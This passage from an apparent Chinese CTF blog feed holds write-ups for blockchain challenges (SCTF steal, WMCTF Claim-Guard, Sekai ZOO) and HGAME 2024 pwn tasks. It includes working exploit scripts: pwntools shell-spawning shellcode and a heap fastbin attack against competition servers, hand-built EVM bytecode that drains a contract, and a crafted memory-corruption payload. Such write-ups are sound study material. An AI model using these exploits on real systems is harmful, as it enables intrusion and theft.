class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line)&lt;=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cmd = <span class="string">b&quot;echo &#x27;&quot;</span> + line.encode() + <span class="string">b&quot;&#x27; &gt;&gt; b64_exp;&quot;</span></span><br><span class="line">    p.sendline(cmd) <span class="comment"># send lines</span></span><br><span class="line">    <span class="comment">#time.sleep(0.02)</span></span><br><span class="line">    <span class="comment">#p.recv()</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;~ #&quot;</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;base64 -d b64_exp &gt; exp.tar.gz;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;tar -xzvf exp.tar.gz&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;chmod +x ./exp;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;./exp&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - CTF_blockchain_summary</title>
    <url>/2024/10/02/comp%20-%20CTF_blockchain_summary/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
CTF 中的 blockchain 题目都放在这里面
</blockquote>
<span id="more"></span>
<h1 id="sctf">[0] 2024 SCTF</h1>
<h2 id="steal">[0-0] steal</h2>
<p>本题参考了 <a
href="https://blog.wm-team.cn/index.php/archives/82/#steal">W&amp;M 的
wp</a></p>
<h3 id="analysis">[0-0-0] analysis</h3>
<p>这道题当时逆向没逆出来，赛后我才知道可以用gpt-o1反汇编yul核心代码（注意是核心代码，要不然体积太大不好翻译），没
gpt plus 的我只能调教 gpt-4o 了。喂给它的 prompt 是</p>
<p>你现在是一位yul-&gt;solidity的反汇编大师，你很擅长推理，请你帮我反汇编以下代码。另外，我有几点要求：
1. 不要重复我给你的Yul代码 2.
如果有些代码需要明确用途，请你直接根据Yul给出对应的solidity代码即可，不能用注释忽略过去</p>
<p>但是func_0x7f中间的一部分代码还是被忽略了，我框起那部分代码之后再让它<code>请你翻译出这部分的代码，我说过不要用注释</code>之后才得到下面的代码，去掉冗余函数，再稍微人工审计整理一下得到下面核心代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Contract &#123;</span><br><span class="line">    function isSolved() internal view returns (bool) &#123;</span><br><span class="line">        uint8 value = uint8(sload(0));</span><br><span class="line">        if (value != 0) &#123;</span><br><span class="line">            if (address(this).balance != 0) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function steal() internal &#123;</span><br><span class="line">        uint8 flag = uint8(sload(0));</span><br><span class="line">        require(flag == 0);</span><br><span class="line">        bool result = check_contract(msg.sender, 0x24a);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">            (bool success, ) = msg.sender.call&#123;value: address(this).balance&#125;(&quot;&quot;);</span><br><span class="line">            require(success);</span><br><span class="line">            sstore(0, uint256(flag | 1));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            revert(&quot;Unauthorized&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check_contract(address _addr, uint256 _val) internal view returns (bool) &#123;</span><br><span class="line">        uint256 size;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            size := extcodesize(_addr)</span><br><span class="line">        &#125;</span><br><span class="line">        if (size == 0 || size &gt; 0x40) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bytes memory code = new bytes(size);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            extcodecopy(_addr, add(code, 0x20), 0, size)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 hashToCompare = 0x29df21df2a5f235f;</span><br><span class="line">        for (uint256 i = 0; i &lt; size; i++) &#123;</span><br><span class="line">            bytes32 chunkHash;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                chunkHash := mload(add(code, add(0x20, i)))</span><br><span class="line">            &#125;</span><br><span class="line">            if (chunkHash == bytes32(hashToCompare)) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>想要 isSolved 很简单，只需要成功调用 steal 函数中的 check_contract
函数，我们来看一下 check_contract 函数。</p>
<p>首先，check_contract
函数检查了调用者的合约代码字节数（如果是EOA字节数为0），这个调用者的合约数必须小于40并且不为0；因此作为攻击者，我们首先需要部署攻击合约(下称evil)。</p>
<p>其次，合约中必须存在0x29df21df2a5f235f这八个字节，要达成这个目的比较简单，只需要在编译好的合约bytecode之后附加这个八个字节即可。</p>
<p>在check_contract合约调用成功之后，steal函数会把自己的所有余额转给evil合约，所以evil合约还要实现fallback函数来接受转账。</p>
<h3 id="perform">[0-0-1] perform</h3>
<p>这种搓 mnemonic 的方式用 <a
href="https://www.evm.codes/playground">这个工具</a>
模拟起来比较方便</p>
<h4 id="initialization-code">[0-0-1-0] initialization code</h4>
<p>首先我们需要知道部署合约的本质其实是发送一个没有to参数的tx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web3.eth.sendTransaction(&#123;</span><br><span class="line">    from: me</span><br><span class="line">    data: 0x......</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>而 data 由两部分组成，前面的部分是 initialization code，后面紧跟
runtime code</p>
<p>initialization code 主要做的就是将 runtime code
放入内存。我们需要用到<code>CODECOPY(t,f,s)</code>和<code>RETURN(p,s)</code>这两个
opcode，一个通用的模板如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUSH1 0x??    // (s: runtime code 字节数)</span><br><span class="line">PUSH1 0x??    // (f: initialization code 字节数)</span><br><span class="line">PUSH1 0x00    // (t: 拷贝到内存的t位置(此处为0x00))</span><br><span class="line">CODECOPY</span><br><span class="line">PUSH1 0x??    // (s: 0x??)</span><br><span class="line">PUSH1 0x00    // (p: 0x00)</span><br><span class="line">RETURN        // (返回mem[p,(p+s)]的内容)</span><br></pre></td></tr></table></figure>
<h4 id="runtime-code">[0-0-1-1] runtime code</h4>
<p>首先我们来处理 fallback，runtime code 都是自上而下执行的，我们需要用
jumpi 和 jumpdest 来实现 selector。</p>
<p>而 fallback 逻辑也很简单，只要调用者是 chall 合约直接
<code>stop</code> 就好，但是由于我们需要与 chall
合约地址进行比较，因此我们需要在 storage 里存入 chall 和
我们自己EOA的地址，所以需要修改 initialization code，在 storage[0]
存入我们自己，[1] 存入 chall_address</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CALLER</span><br><span class="line">PUSH1 0x00</span><br><span class="line">SSTORE        // sstore(0,caller()) 等价于 storage[0] = caller; </span><br><span class="line">PUSH20 chall_address</span><br><span class="line">PUSH1 0x00</span><br><span class="line">SSTORE        // storage[1] = chall_address </span><br><span class="line">PUSH1 0x??    // (s: runtime code 字节数)</span><br><span class="line">PUSH1 0x??    // (f: initialization code 字节数)</span><br><span class="line">PUSH1 0x00    // (t: 拷贝到内存的t位置(此处为0x00))</span><br><span class="line">CODECOPY</span><br><span class="line">PUSH1 0x??    // (s: 0x??)</span><br><span class="line">PUSH1 0x00    // (p: 0x00)</span><br><span class="line">RETURN        // (返回mem[p,(p+s)]的内容)</span><br></pre></td></tr></table></figure>
<p>上面是修改后的 initialization code，下面是 runtime code 处理 fallback
的逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUSH1 0x00</span><br><span class="line">SLOAD</span><br><span class="line">CALLER</span><br><span class="line">EQ            // if caller == storage[0]，condition == 1</span><br><span class="line">PUSH1 0x??    // dest = 0x??</span><br><span class="line">JUMPI         // if condition == 1, jump to JUMPDEST</span><br><span class="line">STOP          // if condition == 0, execute this line</span><br><span class="line">              // 其实就是 fallback 的处理方法</span><br><span class="line">JUMPDEST      // 下面开始是 me 调用该合约时的处理方式</span><br></pre></td></tr></table></figure>
<p>接下来要调用 steal</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUSH1 0x00          // outsize</span><br><span class="line">PUSH1 0x00          // out</span><br><span class="line">PUSH1 0x04          // insize (mem[in...(in+size)]作为call的data)</span><br><span class="line">PUSH1 0x00          // in</span><br><span class="line">PUSH1 0x00          // v</span><br><span class="line">PUSH1 0x01          // 调用slot[1]的地址(chall)</span><br><span class="line">SLOAD               // 调用slot[1]的地址(chall)</span><br><span class="line">PUSH2 0xffff        // g</span><br><span class="line">PUSH4 0xcf7a8965    // bytes4(keccak256(&quot;steal()&quot;))</span><br><span class="line">PUSH1 0xe0          // 将0xcf7a8965左移至最高的4bytes</span><br><span class="line">SHL                 // 将0xcf7a8965左移至最高的4bytes</span><br><span class="line">PUSH1 0x00          // 将上一步得到的32bytes存入内存0号</span><br><span class="line">MSTORE</span><br><span class="line">CALL</span><br><span class="line">STOP</span><br></pre></td></tr></table></figure>
<p>把这几段代码拼起来，用上面那个网站转换mnemonic就可以得到bytecode了，但是有一些问题：首先是远程没有PUSH0，PUSH1
0x00 又会耗费很多字节，所以用SELFBALANCE来代替了PUSH1
0x00；其次是我们需要计算上面那些??代表的数值，最后得到的 bytecode
如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CALLER</span><br><span class="line">SELFBALANCE</span><br><span class="line">SSTORE</span><br><span class="line">PUSH20 0x90b978154ee5bf119262a99be39a2f3a5ae81baf</span><br><span class="line">PUSH1 0x01</span><br><span class="line">SSTORE</span><br><span class="line">PUSH1 0x3f</span><br><span class="line">PUSH1 0x25</span><br><span class="line">SELFBALANCE</span><br><span class="line">CODECOPY</span><br><span class="line">PUSH1 0x3f</span><br><span class="line">SELFBALANCE</span><br><span class="line">RETURN</span><br><span class="line">SELFBALANCE</span><br><span class="line">SLOAD</span><br><span class="line">CALLER</span><br><span class="line">EQ</span><br><span class="line">PUSH1 0x08</span><br><span class="line">JUMPI</span><br><span class="line">STOP</span><br><span class="line">JUMPDEST</span><br><span class="line">SELFBALANCE</span><br><span class="line">SELFBALANCE</span><br><span class="line">PUSH1 0x04</span><br><span class="line">SELFBALANCE</span><br><span class="line">SELFBALANCE</span><br><span class="line">PUSH1 0x01</span><br><span class="line">SLOAD</span><br><span class="line">PUSH2 0xffff</span><br><span class="line">PUSH4 0xcf7a8965</span><br><span class="line">PUSH1 0xe0</span><br><span class="line">SHL</span><br><span class="line">SELFBALANCE</span><br><span class="line">MSTORE</span><br><span class="line">CALL</span><br><span class="line">STOP</span><br></pre></td></tr></table></figure>
<p>转换之后得到<code>3347557390b978154ee5bf119262a99be39a2f3a5ae81baf600155603f60254739603f47f347543314600857005b47476004474760015461ffff63cf7a896560e01b4752f100</code>，再拼接上<code>29df21df2a5f235f</code>，直接发送给rpc_url即可</p>
<p>但是我检查了一下发现这个合约的codesize是大于0x40字节的，不知道为什么原作者可以通过，或许是我检查的范围过大了？</p>
<h2 id="staking">[0-1] staking</h2>
<h1 id="wmctf-claim-guard">[1] 2024 WMCTF Claim-Guard</h1>
<h2 id="概述">[1-0] 概述</h2>
<p>这道题的合约很简单，我们只需要 register 后爆破出合适的 pow 就可以成功
proveWork，然后 claimLastWinner
即可。但是问题在于起服务的时候同时起了一个基于 <a
href="https://github.com/tonyke-bot/burberry">burberry</a> 的 MEV
bot，这个 bot 会在我们发起交易时，用更高的 gasPrice
抢先在我们之前执行交易，这样我们就无法通过
<code>require(solveStatus[msg.sender].nonce == type(uint256).max, "already proved");</code>
或者是 <code>require(status.nonce == 0, "not first solver");</code>
这两条检测了。</p>
<p>因此这道题最重要的点就是如何绕过 MEV Bot</p>
<h2 id="分析">[1-1] 分析</h2>
<blockquote>
<p>合约部分比较简单，我就不分析了，直接从 rust 写的 bot 开始分析</p>
</blockquote>
<h3 id="main.rs">[1-1-0] main.rs</h3>
<p>main函数首先监听了 claim-guard 和 burberry 的日志；然后 parse
args，并创建 ws_provider 和 engine；之后通过 <code>add_collector</code>
来监听 newblock 和 pendingTx 这两个事件；再之后收集一些 tx
必要的信息比如 chain_id, signer；最后实例化 executor 和 strategy，并启动
burberry 的 engine.</p>
<p>值得注意的是，main 函数是基于 tokio 实现的，而 tokio
是事件驱动的，这解释了后面 process_event
为什么没有被调用，但仍能被触发。</p>
<h3 id="executor.rs">[1-1-1] executor.rs</h3>
<p>executor 比较简单，没什么值得注意的地方</p>
<h3 id="strategy.rs">[1-1-2] strategy.rs</h3>
<p>主要注意 <code>process_event</code> 函数，它调用的 process_new_block
和 process_pending_tx 是关键函数。首先看 process_new_block。</p>
<p>process_new_block 函数主要负责
registerBlock，每当新区块被挖掘出来就调用 registerBlock。</p>
<p>process_pending_tx
中，每当接收到新交易就模拟这笔交易执行的环境，在evm中执行并获取执行日志，如果日志中发现了
workProved 的函数签名，bot 就会验证参数 pow
的正确性，如果它发现这是正确的，就会用更高的价格在我们之前注册这笔交易。具体细节可以看下面这段代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 0x27d4563e</span><br><span class="line">let sig: [u8; 4] = [0x27, 0xd4, 0x56, 0x3e];</span><br><span class="line">// concat sig and pow</span><br><span class="line">let mut data = Vec::with_capacity(4 + 32);</span><br><span class="line">data.extend_from_slice(&amp;sig);</span><br><span class="line">data.extend_from_slice(pow.as_slice());</span><br><span class="line">let bytes = Bytes::from(data);</span><br><span class="line"></span><br><span class="line">let bn = finalized_block.header.number.unwrap();</span><br><span class="line">let nonce = *self.nonce_map.get(&amp;bn).unwrap();</span><br><span class="line"></span><br><span class="line">let effective_gas_price = tx.gas_price.or(tx.max_fee_per_gas).unwrap_or_default();</span><br><span class="line">let chain_id = self.provider.get_chain_id().await.unwrap();</span><br><span class="line">let tx_receipt = TransactionRequest &#123;</span><br><span class="line">    from: Some(self.sender_addr),</span><br><span class="line">    to: Some(TxKind::Call(self.chall_addr)),</span><br><span class="line">    gas_price: Some(effective_gas_price * 2),</span><br><span class="line">    gas: Some(100_0000),</span><br><span class="line">    input: TransactionInput::new(bytes),</span><br><span class="line">    chain_id: Some(chain_id),</span><br><span class="line">    nonce: Some(nonce),</span><br><span class="line"></span><br><span class="line">    ..Default::default()</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>我们可以观察到 <code>tx_receipt</code> 中 <code>gas_price</code>
被设置成了 effective_gas_price * 2，而 effective_gas_price 是我们发起的
tx 的 gas_price 或 max_fee_per_gas。这样会导致什么问题呢？由于 bot 是用
anvil 模拟的，而 anvil 会</p>
<h2 id="解题">[1-2] 解题</h2>
<h3 id="爆破-keccak256">[1-2-0] 爆破 keccak256</h3>
<p>爆破出前两字节为 0000 的 keccak256 比较简单，以下是爆破脚本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> keccak</span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pow</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">32</span>):</span><br><span class="line">        keccak_hash = keccak.new(digest_bits=<span class="number">256</span>)</span><br><span class="line">        <span class="built_in">pow</span> = i.to_bytes(<span class="number">32</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        packed = <span class="built_in">pow</span> + <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;00&#x27;</span>*<span class="number">31</span> + <span class="string">&#x27;02&#x27;</span>)</span><br><span class="line">        keccak_hash.update(packed)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(keccak_hash.hexdigest(), <span class="number">16</span>) &lt; <span class="number">2</span>**<span class="number">240</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Found valid PoW:&#x27;</span>, <span class="built_in">pow</span>.<span class="built_in">hex</span>())</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Hash:&#x27;</span>, keccak_hash.hexdigest())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">pow</span>()</span><br></pre></td></tr></table></figure>
<h3 id="section">[1-2-1]</h3>
<h1 id="sekai">[2] 2024 Sekai</h1>
<h2 id="play-to-earn">[2-0] Play to Earn</h2>
<p>这道题实现的 ArcadeMachine 即游戏机可以向 0
地址转账，我一开始觉得这是烧币没啥用...后来发现 permit 里的 ecrecovor
出错时会返回 0 而不是直接回滚，所以可以让 allowance[0][my_address] 为
13.37，然后烧币+转账就可以了</p>
<p>另外有时间的时候可以看看这篇<a
href="https://blog.blockmagnates.com/sekai-ctf-2024-deep-dive-into-the-play-to-earn-blockchain-challenge-a8156be9d44e">medium</a></p>
<h2 id="イベント">[2-1] イベント！</h2>
<p>这道题怎么还用 rust 搞了个服务器...有点复杂，改天再看</p>
<h2 id="zoo">[2-2] ZOO</h2>
<p>这道题怎么还要手撕字节码...有点复杂，今天看了吧...</p>
<p>逻辑很简单，ZOO 里的 fallback 函数接收 calldata 设置
local_animals，然后调用 commit 把 memory 里的 animals 推到 storage
里。问题出在下面这段代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 public isSolved;</span><br><span class="line">AnimalWrapper[] public animals;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">mstore(0x00, animals.slot)</span><br><span class="line">let slot_hash := keccak256(0x00, 0x20)</span><br><span class="line">let animal_addr := sload(add(slot_hash, mul(2, idx)))</span><br><span class="line">let animal_counter := sload(add(add(slot_hash, mul(2, idx)), 1))</span><br></pre></td></tr></table></figure>
<p>由于 isSolved 就在 animals 的上面，所以我们可以让 animal_addr 指向
isSolved - 1，animal_counter 就指向了
isSolved，而且对于内联汇编的溢出，GPT是这样说的：</p>
<blockquote>
<p>在Solidity 0.8.0
及更高版本中，整型运算默认启用了溢出和下溢检查。这意味着，在高层次的Solidity代码中，诸如
+、-
等运算符在出现溢出或下溢时会自动抛出异常（revert）。然而，这个默认的安全机制并不自动适用于内联汇编（Yul）代码。</p>
</blockquote>
<p>所以我们可以大胆构造了：</p>
<p>构造...构造不出来...因为有 whenNotPaused 这个修饰符不让你进这个
commit 函数，并且 idx 不能大于 7...</p>
<p>但跟 Nightu 师傅交流之后我得知 forge
可以动调合约，所以准备跑起来看看。另外，fallback
函数中还有这一段可以控制 idx=7 的 local_animals 指针：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let copy_size := sub(0x100, mul(0x20, idx))</span><br><span class="line">mcopy(offset, add(offset, 0x20), copy_size)</span><br></pre></td></tr></table></figure>
<p>既然我们可以控制指针，就可以在 0x21
修改时对任意内存写了，我们来布置一下任意memory写的payload：</p>
<p>首先，10 00 0000 xxxx(2byte的animal_index) + 30 07，这样就可以把 idx
= 7 的 offset 改成我们任意想要的 2byte</p>
<p>其次，20 07 21 xxxx(2byte的name_length) + payload(长为
name_length)，这样就可以把长度为 payload 的 name_length 复制到上面
animal_index
指向的内存位置了，但这种方式覆盖之后，如果op不是10,20,30，立刻就会break，并且就算不break，由于temp已经被写完，我们也无法再修改了。</p>
<p>既然我们解决了如何写，我们要解决一下要写什么。主要问题有两个：①绕过
whenNotPaused，这个可以通过修改 functions 这一函数指针，直接跳到
whennotPaused 之后。②在 commit 最后一个 sstore 时把 isSolved 改成 1.</p>
<p>我们先来动调看看第一个问题：要解决这个问题，首先我们要知道函数指针存在
memory 的哪里，之后我们得确定修改成什么才能绕过。</p>
<p>存在 memory 的什么地方这个很简单，我们只要看跳转都 commit 时 JUMPDEST
之前的 JUMP 语句栈上第一个变量是什么就行了，我们可以看到是
0x31b，而0x31b存在 memory 的 0xa0 那一行，所以我们要改掉 0xa0
这一行，不过我们先不改，继续看需要改成什么才能绕过。</p>
<p>我们继续单步走下去，看到走到 Address 为 322 时就要跳到 431 去 revert
了，所以我们只需要改成 323，就能绕过这条 jump。综上，我们知道要将 0xa0
这一行的 0x31b 改为 0x323.</p>
<p>所以我们构造的 payload 是：10 00 0000 007e 30 07 20 07 21 0002
0323，动调起来发现已经可以绕过 whenNotPaused 了。</p>
<p>之后，我们再来解决第二个问题：如何写进 isSolved.</p>
<p>commit 里的 sstore
就只有最后那一个，所以我们要想办法在这里做手脚。但由于我们之前布置的
payload 已经 break 了，所以我们希望修改一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10 00 0000 01db</span><br><span class="line">10 00 0000 0000 &lt;- 由于我们需要控制 length 为1，所以要多布置一个块</span><br><span class="line">30 07</span><br><span class="line">20 07 21 0025</span><br><span class="line">20 07 22 0323</span><br><span class="line">00000000000000000000000000000000 00000000000000000000000000000080 </span><br></pre></td></tr></table></figure>
<p>现在我们已经可以顺利进入 commit 的 for(i&lt;length)
循环了，我们接下来的任务是看“什么操控了最后sstore的参数”</p>
<p>我们注意到 40 57 87 fa 12 a8 23 e0 f2 b7 63 1c c4 1b 3b a8 82 8b 33
21 ca 81 11 11 fa 75 cd 3a a3 bb 5a ce 是
slot_hash，而又有下面的代码可知</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let slot_hash := keccak256(0x00, 0x20)</span><br><span class="line">let animal_addr := sload(add(slot_hash, mul(2, idx)))</span><br><span class="line">let animal_counter := sload(add(add(slot_hash, mul(2, idx)), 1))</span><br></pre></td></tr></table></figure>
<p>slot_hash + 2*idx 是 animal_addr，slot_hash + 2*idx + 1 是
animal_counter，那我们合理怀疑 slot[2] 里存的就是这个
slot_hash，动态数组通过访问这个hash值+offset来访问成员。又因为 slot[1]
是 isSolved 变量，所以在 sstore
的参数<code>add(add(slot_hash, mul(2, idx)), 1),</code>中，我们需要计算出
idx，使这个参数等于1，最后可以算出来是0x5fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae225299,因此最后的payload为<code>1000000001fb10010000133730072007210045200722032300000000000000000000000000000000000000000000000000000000000000805fd43c02f6abee0f86a44e719df2622bbeba666f1abf777702c51962ae225299</code></p>
<p>另外，通过这道题我发现了其他几个之前没注意的点:</p>
<ol type="1">
<li><p>在函数被调用之前，EVM会先给这个函数初始化一些环境，还有检查一些内容</p></li>
<li><p>编译器对 solidity 做的优化还挺多的，比如 switch 里的判断</p></li>
<li><p>太夸张了，看N1的wp，我最多就能想到用一个指针去任意地址写，N1的payload用
21 覆盖了原有的指针后，再用覆盖的指针去修改了其他位置</p></li>
<li><p>如果无法方便地利用任意地址读写控制一片内存区域，不妨想想这片内存区域本身的定义是什么，我们是否可以通过原本的定义让他存下某个值（比如本题的
length 就是 animals_counter）</p></li>
</ol>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2024hgame-wp</title>
    <url>/2024/02/14/comp%20-%202024hgame-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
谁除夕和情人节还在加班写 wp 啊😭2024要脱离 game 级别！
</blockquote>
<span id="more"></span>
<h1 id="目录">目录</h1>
<ul>
<li><a href="#week1">Week 1</a>
<ul>
<li><a href="#pwn">Pwn</a></li>
</ul></li>
<li><a href="#week2">Week 2</a>
<ul>
<li><a href="#pwn---ak">Pwn</a></li>
<li><a href="#rev">Rev</a></li>
</ul></li>
<li><a href="#week3">Week3</a>
<ul>
<li><a href="#pwn---一血">Pwn</a></li>
</ul></li>
<li><a href="#week4">Week4</a>
<ul>
<li><a href="#pwn-1">Pwn</a></li>
</ul></li>
</ul>
<h1 id="week1">Week1</h1>
<p>week1 在做项目，把这事给忘了，做 week2 的时候为了找灵感做了一下 week1
的 ezshellcode</p>
<h2 id="pwn">Pwn</h2>
<h3 id="ezshellcode">ezshellcode</h3>
<p>alphanumeric shellcode <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ae64 import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;106.14.57.14:30657&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">io.sendlineafter(&#x27;input the length of your shellcode:&#x27;,str(-1))</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">payload = AE64().encode(payload,&#x27;rax&#x27;,0,&#x27;small&#x27;)</span><br><span class="line">print(payload.decode(&#x27;latin-1&#x27;))</span><br><span class="line">io.sendafter(&#x27;input your shellcode:&#x27;,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<h1 id="week2">Week2</h1>
<h2 id="pwn---ak">Pwn - AK</h2>
<h3 id="fastnote">fastnote</h3>
<p>libc-2.31，填满 tcachebin 的 unsortedbin leak + fastbin attack
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;47.102.130.35:31898&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.31.so&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(Index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line">  io.sendlineafter(&#x27;Size: &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Content: &#x27;, content)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def show(Index):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def free(Index):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payload = &#x27;A&#x27;*4</span><br><span class="line">for i in range(8):</span><br><span class="line">    alloc(i,0x80,payload) # chunk0-6 tcachebin, chunk7: unsortedbin</span><br><span class="line"></span><br><span class="line">alloc(8,0x10,payload) # 防annex</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">   free(i)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    alloc(i,0x80,payload) # chunk0-6 tcachebin</span><br><span class="line"></span><br><span class="line">payload = &#x27;A&#x27;*7</span><br><span class="line">alloc(7,0x08,payload) # 因为 read 函数貌似会把 chunk 内部用 &#x27;\x00&#x27; 填满，所以只申请0x08，可以留下 bk 里的信息</span><br><span class="line"></span><br><span class="line">show(7)</span><br><span class="line">main_arena = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - 0x80 - 0x60</span><br><span class="line">main_arena_offset = libc.sym[&quot;__malloc_hook&quot;] + 0x10</span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">print(&quot;main_arena   ---&gt;   &quot;,hex(main_arena))</span><br><span class="line">print(&quot;main_arena_offset   ---&gt;   &quot;,hex(main_arena_offset))</span><br><span class="line">print(&quot;libc_base    ---&gt;   &quot;,hex(libc_base))</span><br><span class="line"></span><br><span class="line">alloc(0,0x60,payload) # 申请 unsortedbin 里面的 chunk，便于后面 alloc</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">payload = &#x27;a&#x27;*8</span><br><span class="line">for i in range(9):</span><br><span class="line">  alloc(i,0x10,payload) # chunk0-6:&quot;7 tcachebin chunks&quot;  || chunk7,8:&quot;fastbin chunk&quot;</span><br><span class="line"></span><br><span class="line">for i in range(9):</span><br><span class="line">  free(i) # free(0-6) free(7,8)</span><br><span class="line"></span><br><span class="line">free(7)</span><br><span class="line"></span><br><span class="line"># gdb.attach(io) # state1</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">  alloc(i,0x10,payload) # chunk0-6: 清空tcachebin</span><br><span class="line"></span><br><span class="line">malloc_addr = libc_base + 